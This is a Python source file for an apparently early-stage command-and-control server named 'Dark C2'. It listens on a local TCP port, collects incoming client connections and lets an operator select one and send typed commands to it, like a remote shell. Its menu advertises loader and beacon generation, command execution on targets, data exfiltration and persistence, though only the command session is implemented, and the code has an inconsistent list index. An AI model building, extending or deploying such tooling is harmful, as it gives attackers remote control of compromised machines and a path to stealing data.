import socket
import threading
import pyfiglet
import os

socket_list = []

# Function to handle the connection received
def listener_module():
    os.system("cls")
    header = "Socket List"
    print(f"{header:^40}")  # Centered header
    print("=" * 40)
    for i, soc in enumerate(socket_list):
        peer_name = soc.getpeername()
        print(f"Connection from  [{i+1}]: Peer Address = {peer_name}")
    print("Enter 0 To Exit To Main Menu")  
    print("=" * 40)     
    
    # i=0
    # for soc in socket_list:
    #     print("f{[i]}",soc.getpeername())
    #     i=i+1   
    i=int(input("Select:"))
    if(i== 0):
        os.system("cls")
        return
    print(socket_list[i].getpeername())
    response = manage_client(socket_list[i-1], socket_list[i-1].getpeername())
    if(response == "nuke"):
        return
    if(response == "exit"):
        listener_module()

def manage_client(client_socket, client_address):
    res=""
    print(f"We have an incoming connection request accepted from {client_address}")
    while True:
        try:
            message = client_socket.recv(10240)
            print(f"Received from {client_address}: {message.decode('utf-8')}")
            response = input(">> ")
            if (message.decode('utf-8') == "nuke" or response == "nuke"):
                client_socket.close()
                socket_list.remove(client_socket)
                print(f"Connection from {client_address} has been closed")
                res="nuke"
                break
            if message.decode('utf-8') == "exit" or response == "exit":
                res="exit"
                break
            client_socket.send(response.encode('utf-8'))
        except ConnectionResetError:
            break
    return res    
    

# Server function to accept connections
def accept_connections(server):
    while True:
        client_socket, client_address = server.accept()
        socket_list.append(client_socket)


# Server setup
def start_server(host='127.0.0.1', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)  # Listen for up to 5 connections
    print(f"Server listening on {host}:{port}")

    # Start the thread to accept connections
    accept_thread = threading.Thread(target=accept_connections, args=(server,))
    accept_thread.daemon = True
    accept_thread.start()

    # Main thread handles the menu
    while True:
        ascii_banner = pyfiglet.figlet_format("Dark C2 : Let's Rule!")
        print(ascii_banner)
        choice = menu()
        if choice == '5':
            listener_module()
        elif choice == '8':
            break

def menu():
    print("Select an option:")
    print("1. Loader Generation")
    print("2. Payload/Beacon Generation")
    print("3. Configure C2 Server")
    print("4. Communication Channel Setup")
    print("5. Execute Commands on Target")
    print("6. Data Exfiltration Setup")
    print("7. Persistence Mechanism Setup")
    print("8. Exit")
    choice = input("=> ")
    return choice

if __name__ == "__main__":
   
    start_server()
